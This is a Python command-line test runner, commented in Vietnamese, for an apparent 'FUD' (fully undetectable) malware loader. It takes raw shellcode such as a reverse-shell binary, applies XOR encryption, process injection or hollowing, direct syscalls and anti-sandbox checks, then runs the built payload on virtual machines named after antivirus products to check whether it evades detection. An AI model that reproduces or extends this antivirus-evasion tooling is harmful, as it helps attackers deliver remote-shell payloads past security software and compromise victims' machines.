import argparse
import os
import core_engine 

def main():
    parser = argparse.ArgumentParser(description="FUD Loader - Command-Line Test Runner")
    
    # --- Input & Build Options ---
    parser.add_argument("-s", "--shellcode", required=True, help="Path to the raw shellcode file (e.g., shellcodes/revshell_x64.bin)")
    parser.add_argument("-e", "--encryption", default="xor", choices=["none", "xor"], help="Encryption method to use.")
    parser.add_argument("-i", "--injection", default="classic", choices=["classic", "hollowing"], help="Injection technique to use.")
    parser.add_argument("--api-method", default="winapi", choices=["winapi", "syscalls"], help="Method for calling Windows APIs.")
    
    # --- Evasion & Debug Options ---
    parser.add_argument("--anti-evasion", action="store_true", help="Enable anti-analysis and anti-sandbox checks.")
    parser.add_argument("--debug", action="store_true", help="Build the payload in debug mode (with popups).")

    # --- Test Execution Options ---
    parser.add_argument("-v", "--vms", nargs='*', help="List of VMs to test on (e.g., \"Windows Defender\"). Not required if --build-only is used.")
    
    # --- THAY ĐỔI 1: THÊM CỜ MỚI ---
    parser.add_argument("--build-only", action="store_true", help="Only build the payload and exit without running tests.")

    args = parser.parse_args()

    # --- THAY ĐỔI 2: KIỂM TRA LOGIC ĐIỀU KIỆN ---
    # Nếu không phải chỉ build, thì phải có VM để test
    if not args.build_only and not args.vms:
        parser.error("-v/--vms is required unless --build-only is specified.")

    # --- START ---
    print("="*50)
    print("      FUD AUTOMATED TEST RUNNER - CLI MODE")
    print("="*50)

    # 1. Xây dựng payload (luôn thực hiện)
    build_options = vars(args)
    
    payload_path = core_engine.build_payload(args.shellcode, build_options)

    if not payload_path:
        print("\n[!] Payload build failed. Aborting.")
        return
    
    print(f"\n[SUCCESS] Payload built successfully at: {payload_path}")

    # --- THAY ĐỔI 3: DỪNG LẠI NẾU CHỈ BUILD ---
    if args.build_only:
        print("\n--build-only flag detected. Exiting now.")
        return

    # 2. Kiểm tra xem tên VM người dùng nhập có trong config không
    for vm_name in args.vms:
        if vm_name not in core_engine.VMS_CONFIG:
            print(f"[!] Error: VM name '{vm_name}' is not defined in core_engine.py's VMS_CONFIG.")
            return

    # 3. Chạy test trên từng VM đã chọn
    all_results = {}
    for vm_name in args.vms:
        result = core_engine.run_single_test(vm_name, payload_path, build_options)
        all_results[vm_name] = result

    # 4. In báo cáo cuối cùng
    print("\n" + "="*50)
    print("                 FINAL REPORT")
    print("="*50)
    for vm_name, result in all_results.items():
        print(f"--- VM: {vm_name} ---")
        # Đảm bảo result không phải là None
        if result:
            print(f"Status: {result.get('status', 'UNKNOWN')}")
            if 'FAILED' in result.get('status', ''):
                print("Log Details:")
                print(result.get('log', 'No log details available.'))
        else:
            print("Status: ERROR - Test did not return a result.")
        print("-" * (len(vm_name) + 8))


if __name__ == "__main__":
    # Đảm bảo các thư mục cần thiết tồn tại
    os.makedirs('build', exist_ok=True)
    os.makedirs('output', exist_ok=True)
    os.makedirs('uploads', exist_ok=True)
    os.makedirs('test_logs', exist_ok=True)
    
    main()